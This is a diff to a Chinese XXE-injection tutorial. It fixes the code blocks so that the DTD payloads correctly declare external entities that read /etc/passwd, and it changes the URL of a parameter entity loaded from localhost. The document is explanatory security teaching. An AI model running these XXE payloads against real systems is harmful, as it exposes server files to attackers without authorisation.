@@ -100,7 +100,7 @@ DTD文档中有很多重要的关键字如下：
 ```bash
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE a [
-    <!ENTITY % name SYSTEM "file://etc/passwd">
+    <!ENTITY % name SYSTEM "file:///etc/passwd">
     %name;
 ]>
 ```
@@ -110,7 +110,7 @@ DTD文档中有很多重要的关键字如下：
 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。
 
 #### 外部实体
-外部实体即在DTD中使用：
+外部实体即在DTD中使用
 ```bash
 <!ENTITY 实体名称 SYSTEM "URI">
 ```
@@ -121,7 +121,7 @@ DTD文档中有很多重要的关键字如下：
 ```bash
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE a [
-    <!ENTITY content SYSTEM "file://etc/passwd">]>
+    <!ENTITY content SYSTEM "file:///etc/passwd">]>
 <foo>
         <value>&content;</value> 
 </foo>
@@ -145,7 +145,7 @@ XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE
 ```bash
 <?xml version=”1.0” encoding=”UTF-8”?>  
 <!DOCTYPE ANY [  
-<!ENTITY % name SYSTEM "http://localhost/test.xml">  
+<!ENTITY % name SYSTEM "http://localhost/index.html">  
 %name;  
 ]>
 ```
